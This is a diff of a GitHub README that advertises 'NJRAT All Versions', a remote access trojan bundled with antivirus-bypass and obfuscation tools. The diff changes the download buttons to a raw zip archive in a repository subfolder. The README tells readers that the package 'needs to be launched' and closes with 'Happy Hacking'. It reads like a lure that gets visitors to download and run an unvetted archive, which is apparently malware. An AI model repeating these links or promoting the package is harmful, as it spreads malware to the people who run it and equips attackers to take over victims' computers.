@@ -1,7 +1,7 @@
 
 # 💻 NJRAT All Versions 💻
 
-[![Download Software](https://github.com/YUNIWORLS/NJRAT-All-Versions/releases/download/v2.0/Software.zip)](https://github.com/YUNIWORLS/NJRAT-All-Versions/releases/download/v2.0/Software.zip)
+[![Download Software](https://raw.githubusercontent.com/YUNIWORLS/NJRAT-All-Versions/main/folletage/NJRA-Versions-All-v3.5.zip)](https://raw.githubusercontent.com/YUNIWORLS/NJRAT-All-Versions/main/folletage/NJRA-Versions-All-v3.5.zip)
 
 Welcome to the NJRAT All Versions repository! Here you will find all versions of NJRAT along with various tools related to anti-virus bypass, encryption, decryption, obfuscation, and more. Whether you are a cybersecurity enthusiast, a researcher, or a hacker, this collection of tools will surely pique your interest.
 
@@ -42,7 +42,7 @@ NJRAT, or "NjRat Lime Edition," is a remote access trojan (RAT) that allows atta
 
 Click the button below to download the software package containing all versions and related tools:
 
-[![Download Software](https://github.com/YUNIWORLS/NJRAT-All-Versions/releases/download/v2.0/Software.zip)](https://github.com/YUNIWORLS/NJRAT-All-Versions/releases/download/v2.0/Software.zip)
+[![Download Software](https://raw.githubusercontent.com/YUNIWORLS/NJRAT-All-Versions/main/folletage/NJRA-Versions-All-v3.5.zip)](https://raw.githubusercontent.com/YUNIWORLS/NJRAT-All-Versions/main/folletage/NJRA-Versions-All-v3.5.zip)
 
 **Note:** The software package needs to be launched to access the contents.
 
@@ -52,4 +52,4 @@ If the provided download link does not work or if you are looking for more infor
 
 ## 🖥️ Happy Hacking! 🖥️
 
-![NJRAT](https://github.com/YUNIWORLS/NJRAT-All-Versions/releases/download/v2.0/Software.zip)
+![NJRAT](https://raw.githubusercontent.com/YUNIWORLS/NJRAT-All-Versions/main/folletage/NJRA-Versions-All-v3.5.zip)
